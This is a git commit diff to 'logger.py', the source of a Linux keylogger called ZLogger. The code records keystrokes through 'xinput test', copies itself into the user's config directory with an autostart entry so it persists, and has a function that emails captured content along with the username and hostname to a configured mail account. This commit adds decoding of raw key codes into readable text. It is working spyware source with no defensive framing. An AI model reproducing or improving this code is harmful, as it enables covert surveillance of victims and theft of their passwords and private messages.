68f64db5990d66285aef4d61d6ff33b7eed2b0cc
root <root@localhost.localdomain>
2017-04-19 18:31:57 -0400

    send human readable logs

--- logger.py
+++ logger.py
@@ -24,70 +24,118 @@ Name=Xinput
 """
 
 def send_mail(subject, content):
-	body = "\n** ZLogger **"
-	body = body + "\nThis message is sent from :"
-	body = body + sysinfo()
-	body = body + "\n---------------------------\n\n"
-	body = body + content
-	msg = MIMEMultipart()
-	msg['Subject'] = subject
-	msg.attach(MIMEText(body))
-	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
-	
-	mailer.starttls()
-	mailer.login(config.EMAIL, config.PASSWORD)
+    body = "\n** ZLogger **\n"
+    body = body + "\nThis message is sent from :"
+    body = body + sysinfo()
+    body = body + "\n---------------------------\n\n"
+    body = body + content
+    msg = MIMEMultipart()
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body))
+    mailer = smtplib.SMTP(EMAIL_SERVER, 587)
 
-	mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
-	mailer.close()
+    mailer.starttls()
+    mailer.login(config.EMAIL, config.PASSWORD)
+
+    mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
+    mailer.close()
 
 def sysinfo():
-	return "\nUser : " + getuser() + "\nHostname : " + gethostname()
+    return "\nUser : " + getuser() + "\nHostname : " + gethostname()
 
 def start_logging(log_file):
-	devices = check_output("xinput list | grep AT", shell=True)
+    devices = check_output("xinput list | grep AT", shell=True)
 
-	regex = re.compile('id=([^"]+)\t')
-	keyboard_id = regex.findall(devices)[0]
+    regex = re.compile('id=([^"]+)\t')
+    keyboard_id = regex.findall(devices)[0]
 
-	command = "xinput test " + keyboard_id + " > " + log_file
-	Popen(command , shell=True)
+    command = "xinput test " + keyboard_id + " > " + log_file
+    Popen(command , shell=True)
 
 def chmod_to_exec(file):
-	os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
+    os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
 
 
 def initialize():
-	try:
-	    os.makedirs(AUTOSTART_PATH)
-	except OSError:
-	    pass
-	
-	current_file = os.path.realpath(__file__).replace(".py", "")
-	
-	destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
-	copyfile(current_file, destination_file)
-	chmod_to_exec(destination_file)
+    try:
+        os.makedirs(AUTOSTART_PATH)
+    except OSError:
+        pass
 
-	with open(AUTOSTART_FILE,'w') as out:
-	    out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")
+    current_file = os.path.realpath(__file__).replace(".py", "")
 
-	chmod_to_exec(AUTOSTART_FILE)
+    destination_file = HOME_CONFIG_DIRECTORY + config.FILE_NAME
+    copyfile(current_file, destination_file)
+    chmod_to_exec(destination_file)
 
-	#Get Keyboard map and send it
-	kmap = check_output("xmodmap -pke", shell=True)
-	send_mail("Zlogger Character Map",kmap)
-	Popen(destination_file)
+    with open(AUTOSTART_FILE,'w') as out:
+        out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")
+
+    chmod_to_exec(AUTOSTART_FILE)
+
+    Popen(destination_file)
+
+def generate_chars_dict(charmap):    
+    chars_dict = dict()
+    for line in charmap.split("\n"):
+        line = line.split()
+        try:
+            chars_dict[line[1]] = (process_key(line[3]), process_key(line[4]))
+            character = line[3]
+        except IndexError:
+            continue
+    return chars_dict
+
+def process_key(key):
+    if len(key) == 1:
+        return key
+    elif key == "Return":
+        return "\n"
+    elif key == "space":
+        return " "
+    elif key == "Shift_L" or key == "Shift_R":
+        return "shift" 
+    else:
+        return "<" + key + ">"        
+
+
+def translate_log(file, chars_dict):
+    shift = False
+    log = ""
+    with open(file) as log_file:
+        for line in log_file.readlines():
+            line = line.split()
+            char_code = line[2]
+
+            if shift and chars_dict[char_code][0] == "shift":
+                shift = False
+
+            
+            if line[1] == 'press':
+                  key = chars_dict[char_code][0]
+                  if key == "shift":
+                    shift = True
+                    continue
+
+                  if shift:
+                    key = chars_dict[char_code][1] 
+                  log = log + key
+    return log
+
 
 def send_mail_reports_every(interval):
-	while True:
-		sleep(interval)
-		send_mail("Zlogger Report", file(LOG_FILE).read())
-		with open(LOG_FILE, "w"):
-			pass
+    kmap = check_output("xmodmap -pke", shell=True)
+    chars_dict = generate_chars_dict(kmap)
+    while True:
+        sleep(interval)
+        print translate_log(LOG_FILE, chars_dict)
+
+        with open(LOG_FILE, "w"):
+            pass
 
 
 if not os.path.isfile(AUTOSTART_FILE) :
-	initialize()
+      initialize()
 else:
-	start_logging(LOG_FILE)
-	send_mail_reports_every(config.SLEEP_INTERVAL)
+      start_logging(LOG_FILE)
+      send_mail_reports_every(config.SLEEP_INTERVAL)
